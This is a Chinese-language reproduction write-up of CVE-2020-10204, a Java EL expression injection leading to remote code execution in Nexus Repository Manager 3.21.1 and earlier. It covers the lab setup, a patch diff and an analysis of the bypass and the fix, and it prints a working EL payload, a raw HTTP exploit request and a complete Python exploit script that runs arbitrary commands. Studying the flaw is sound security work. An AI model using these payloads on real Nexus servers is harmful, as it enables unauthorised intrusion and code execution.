---
title: "（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞"
id: zhfly3040
---

# （CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞

## 一、漏洞简介

## 二、漏洞影响

所有以前的Nexus Repository Manager 3.x OSS / Pro最高版本包括3.21.1

## 三、复现过程

### 环境搭建

下载pull下漏洞版本的docker

```
https://hub.docker.com/r/sonatype/nexus3/tags 
```

```
docker pull sonatype/nexus3:3.21.1 
```

然后切成root用户进入容器修改启动项**/opt/sonatype/nexus/bin/nexus**

```
run) `$INSTALL4J_JAVA_PREFIX exec “$app_java_home/bin/java”  -Xdebug -server -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8888 -Dinstall4j.jvmDir="$app_java_home" -Dexe4j.moduleName="$prg_dir/$progname" “-XX:+UnlockDiagnosticVMOptions” “-Dinstall4j.launcherId=245” “-Dinstall4j.swt=false” “$vmov_1” “$vmov_2” “$vmov_3” “$vmov_4” “$vmov_5” $INSTALL4J_ADD_VM_PARAMS -classpath “$local_classpath” com.install4j.runtime.launcher.UnixLauncher run 9d17dc87 0 0 org.sonatype.nexus.karaf.NexusMain` 
```

![image](../img/07e52054baceb7a45cbee16566c4273c.png)

然后在**https://github.com/sonatype/nexus-public**下载源码,导入idea,然后配好远程配置连上去即可调试。

![image](../img/29e4e2af65b548c251136fd859f167dc.png)

### 漏洞分析

我们先来diff一下3.21.0和3.21.2的区别,找一下官方修复的痕迹

![image](../img/843b75204ed2ca48fc7c1b3eb6de136e.png)

可以看到有很明显的漏洞修复痕迹,EL表达式注入的限制被绕过了,其实我们看到测试文件

```
@Test
  public void testStripJavaEl_bugged_interpolator() {
    String test = "$\\A{badstuffinhere}";
    String result = underTest.stripJavaEl(test);
    assertThat(result, is("{badstuffinhere}"));
  } 
```

也可以直接知道绕过方法,这里我直接给我rce的poc

```
$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /tmp/sssss')} 
```

为什么增加了`\A`还不影响表达式的解析呢,这个我后面说,先构造出完整poc

那么我们找一下哪些接口会使用

![image](../img/b8bd7fd96c6368c77190bbac3e4fb9be.png)

可以看到总过有三处,以第一处Roles为例,

![image](../img/41019ea35cc0c96ca36e4b292f7d8e79.png)

可以找到有多处注解使用的地方,比如说新建用户/更新用户,构造Poc如下

```
POST /service/extdirect HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Nexus-UI: true
NX-ANTI-CSRF-TOKEN: 0.029301195082771514
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 350
Connection: close
Referer: http://127.0.0.1:8081/
Cookie: NX-ANTI-CSRF-TOKEN=0.029301195082771514; NXSESSIONID=7eaf0643-2707-445a-b17d-aedced6db8e5 `{“action”:“coreui_User”,“method”:“create”,“data”:[{“[userId":“3”,“version”:"",“firstName”:“test”,“lastName”:“test”,“email”:"test@test.com](mailto:userId%22:%223%22,%22version%22:%22%22,%22firstName%22:%22test%22,%22lastName%22:%22test%22,%22email%22:%22test@test.com)”,“status”:“active”,“roles”:["$\X{’’.getClass().forName(‘java.lang.Runtime’).getMethods()[6].invoke(’’.getClass().forName(‘java.lang.Runtime’)).exec(‘touch /tmp/rce’)}"],“password”:“admin”}],“type”:“rpc”,“tid”:33}` 
```

![image](../img/52415b95d61771053a72480d83632881.png)

以及其他几处注解使用的地方

![image](../img/dc5cc352e3667292d0f41864986487c8.png)

还有一个问题为什么增加`\A`不会影响表达式的解析呢?

在`/org/hibernate/validator/hibernate-validator/6.1.0.Final/hibernate-validator-6.1.0.Final.jar!/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class`对传入的字符串进行了两次处理,

原本的字符串为`Missing roles: [$\B{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /tmp/rce')}]`

然后第一次处理后的结果

![image](../img/f44f71badb262ddd59bb2b54f0b31c57.png)

第二次处理后的结果

![image](../img/33ca815930a8bee1333a38f01c5023b2.png)

最后解析的还是`${xxxx}`这样子。

我在3.21.1版本测试`$\\\B{}`这样也是可以执行的,但是增加替换规则只是限制了`A`啊,那这样不就还是可以绕过嘛?

![image](../img/b8637659c7aa8ccf970991d149d7ea8d.png)

然后我启了一个`3.21.2`版本的docker,测试发现并不行,很困惑,这里我跟一下原因。

在我跟到`/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class`发现大致调用堆栈是差不多的

![image](../img/0c8d96ff8f9ce54e6ebfb4de18649f50.png)

但是再往下就有区别的,3.21.0版本调用了`/org/hibernate/validator/messageinterpolation/ResourceBundleMessageInterpolator.class@InterpolationTerm`,而3.21.2版本调用的是`/org/hibernate/validator/messageinterpolation/ParameterMessageInterpolator.class@InterpolationTerm`,但是最开始的区别并不是这里,这两个类都是继承了AbstractMessageInterpolator,然后重写的`public String interpolate(Context context, Locale locale, String term)`方法不同,

`ParameterMessageInterpolator.class@InterpolationTerm`会进行表达式的检测

```
public String interpolate(Context context, Locale locale, String term) {
        if (InterpolationTerm.isElExpression(term)) {
            LOG.warnElIsUnsupported(term);
            return term;
        } else {
            ParameterTermResolver parameterTermResolver = new ParameterTermResolver();
            return parameterTermResolver.interpolate(context, term);
        }
    } 
```

如果表达式以`$`开头,会直接打印warning,然后返回表达式字符串。

![image](../img/a5ca18d52253743fc947afccb1ab3ac9.png)

但是这里是hibernate包中的,我们需要去找到源头,也就是nexus开发者是怎么去修复的呢?

在一阵搜索中,我在`nexus-public-release-3.22.0-02/components/nexus-validation/src/main/java/org/sonatype/nexus/validation/ValidationModule.java`找到了

![image](../img/a1bb6c2ba47aa9af5911f11831c25d27.png)

通过搜索资料了解到Hibernate Validator提供了ParameterMessageInterpolator来处理消息,并且不解析使用`$`的表达式,也就是说即使绕过了replace的地方,也不会作为表达式进行解析,而是直接返回了。

### poc

```
cve-2020-10204_cmd.py 
```

```
#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:zhzyker
# from:https://github.com/zhzyker/exphub

import sys

import requests

if len(sys.argv)!=4:

print(‘±--------------------------------------------------------------------------------------------------------+’)

print(’+ DES: by zhzyker as [https://github.com/zhzyker/exphub](https://github.com/zhzyker/exphub)                                                    +’)

print(’+      CVE-2020-10204 Nexus Repository Manager 3 Remote Code Execution                                    +’)

print(‘±--------------------------------------------------------------------------------------------------------+’)

print(’+ USE: python3 <filename> <url> <session> <cmd>                                                           +’)

print(’+ EXP: python3 cve-2020-11444_exp.py [http://ip:8081](http://ip:8081) 6c012a5e-88d9-4f96-a05f-3790294dc49a “touch /tmp/233” +’)

print(’+ VER: Nexus Repository Manager 3.x OSS / Pro <= 3.21.1                                                   +’)

print(‘±--------------------------------------------------------------------------------------------------------+’)

sys.exit(0)

url = sys.argv[1]

vuln_url = url + “/service/extdirect”

session = sys.argv[2]

cmd = sys.argv[3]

headers = {

‘accept’: “application/json”,

‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36”,

‘NX-ANTI-CSRF-TOKEN’: “0.856555763510765”,

‘Content-Type’: “application/json”,

‘Cookie’: “jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=”+session+""

}

data = “”"

{“action”:“coreui_Role”,“method”:“create”,“data”:[{“version”:"",“source”:“default”,“id”:“1111”,“name”:“2222”,“description”:“3333”,“privileges”:["$\\A{’’.getClass().forName(‘java.lang.Runtime’).getMethods()[6].invoke(null).exec(’%s’)}"],“roles”:[]}],“type”:“rpc”,“tid”:89}

“”" % cmd `r = requests.post(url=vuln_url, headers=headers, data=data, timeout=20)

if r.status_code == 200:

if “UNIXProcess” in r.text:

print ("[+] Command Executed Successfully (Not Echo)")

else:

print ("[-] Command Execution Failed")

else:

print ("[-] Target Not CVE-2020-10204 Vuln Good Luck")` 
```

## 参考链接

> https://xz.aliyun.com/t/7559